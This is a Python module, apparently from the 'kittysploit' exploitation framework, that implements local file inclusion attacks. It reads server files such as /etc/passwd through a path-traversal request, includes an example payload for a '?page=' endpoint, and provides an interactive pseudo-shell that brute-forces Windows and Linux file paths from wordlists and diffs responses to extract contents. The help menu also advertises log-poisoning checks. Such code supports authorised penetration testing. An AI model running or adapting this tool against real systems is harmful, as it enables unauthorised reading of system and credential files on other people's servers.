from kittysploit.core.framework.base_module import BaseModule
from kittysploit.core.framework.option import OptString, OptPort, OptBool
from kittysploit.core.framework.failure import ProcedureError
from kittysploit.core.base.io import (
    print_info,
    print_error,
    print_success,
    print_status,
)
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.shortcuts import prompt, CompleteStyle
import os
import difflib


class Lfi(BaseModule):

    file_read = OptString("/etc/passwd", "file to read in lfi", required=True)
    shell_lfi = OptBool(False, "Start lfi pseudo shell", required=False)

    def handler_lfi(self):

        # Initialiser la session de prompt
        if self.shell_lfi:
            if not hasattr(self, "execute"):
                print_error(
                    "If you want use shell_lfi, you should have 'execute' method, see example:"
                )
                print_info()
                print_info("### Example ###")
                print_info(
                    """
def execute(self, cmd):
    pwn = self.http_request(
                        method='GET',
                        path=self.uripath+"vulnerabilities/fi/?page=../../../../../../../.."+cmd,
                        session=True
                        )
    if pwn:
        if pwn.status_code == 200:	
            return pwn.text
        return False"""
                )
                print_info()
                return
            help_commands = [
                "help",
                "exit",
                "?check_files_win_big",
                "?check_files_win_small",
                "?check_files_linux",
            ]
            completer = WordCompleter(help_commands, ignore_case=True)
            history = InMemoryHistory()
            template = self.execute("")
            print_info()
            print_status("Welcome to lfi pseudo shell")
            print_status("Enter file name or help command")
            print_info()
            while True:
                command = prompt(
                    "lfi shell> ",
                    completer=completer,
                    complete_in_thread=True,
                    complete_while_typing=True,
                    complete_style=CompleteStyle.READLINE_LIKE,
                    history=history,
                )
                if command == "":
                    continue
                elif command == "exit":
                    break
                elif command == "help":
                    print_info()
                    print_info("\thelp menu lfi")
                    print_info("\t-------------")
                    print_info(
                        "\t?check_files_win_big                 Run big windows files"
                    )
                    print_info(
                        "\t?check_files_win_small               Run little files"
                    )
                    print_info("\t?check_files_linux                   Run linux files")
                    print_info("\t?check_poisoning                     Check poisoning")
                    print_info(
                        "\t?ssh_poisoning                       Check ssh poisoning"
                    )
                    print_info(
                        "\t?apache_poisoning                    Check apache poisoning"
                    )
                    print_info(
                        "\t?vsftp_poisoning                     Check vsftp poisoning"
                    )
                    print_info(
                        "\t?save <filename>                     Saves the file on disk"
                    )
                    print_info()

                elif command == "?check_files_win_small":
                    try:
                        with open(
                            os.path.join("data/wordlists/lfi/win_small.txt")
                        ) as f:
                            lines = f.readlines()
                            print_status(f"Files found with {len(lines)} lines")
                            for line in lines:
                                output = self.execute(line.strip())
                                if output:
                                    print_success(line.strip())

                    except FileNotFoundError:
                        print_error("File win_small.txt not found")
                    except Exception as e:
                        print_error(e)

                elif command == "?check_files_win_big":
                    try:
                        with open(os.path.join("data/wordlists/lfi/win_big.txt")) as f:
                            lines = f.readlines()
                            print_status(f"Files found with {len(lines)} lines")
                            for line in lines:
                                output = self.execute(line.strip())
                                if output:
                                    print_success(line.strip())

                    except FileNotFoundError:
                        print_error("File win_big.txt not found")
                    except Exception as e:
                        print_error(e)

                elif command == "?check_files_linux":
                    try:
                        with open(os.path.join("data/wordlists/lfi/linux.txt")) as f:
                            lines = f.readlines()
                            print_status(f"Files found with {len(lines)} lines")
                            for line in lines:
                                output = self.execute(line.strip())
                                if output:
                                    print_success(line.strip())

                    except FileNotFoundError:
                        print_error("File linux.txt not found")
                    except Exception as e:
                        print_error(e)

                else:
                    try:
                        command_output = self.execute(command)
                        output = self._compare_texts(command_output, template)
                        if output:
                            print_info(output)
                    except Exception as e:
                        print_error(e)
        else:
            output = self.execute(self.file_read)
            print_info(output)

    def _compare_texts(self, text1, text2):
        d = difflib.Differ()
        diff = list(d.compare(text1.splitlines(), text2.splitlines()))
        unique_lines = [line[2:] for line in diff if line.startswith("- ")]

        return "\n".join(unique_lines)
